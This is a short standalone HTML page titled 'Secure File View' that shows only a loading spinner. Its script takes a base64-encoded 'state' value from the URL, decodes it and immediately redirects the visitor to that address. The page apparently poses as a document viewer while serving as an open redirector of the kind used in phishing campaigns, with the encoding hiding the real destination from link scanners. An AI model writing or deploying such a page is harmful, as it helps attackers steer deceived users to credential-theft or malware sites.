<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure File View</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f3f3f3; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .loader { width: 48px; height: 48px; border: 4px solid #e0e0e0; border-top-color: #0078d4; border-radius: 50%; animation: spin 0.7s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader"></div>
<script>
(function() {
  var params = new URLSearchParams(location.search);
  var state = params.get('state');
  if (!state) {
    var hashState = location.hash.indexOf('state=');
    if (hashState > -1) state = location.hash.substring(hashState + 6).split('&')[0];
  }
  if (state) {
    try {
      var url = atob(decodeURIComponent(state));
      if (/^https?:\/\//.test(url)) location.replace(url);
    } catch(e) {}
  }
})();
</script>
</body>
</html>
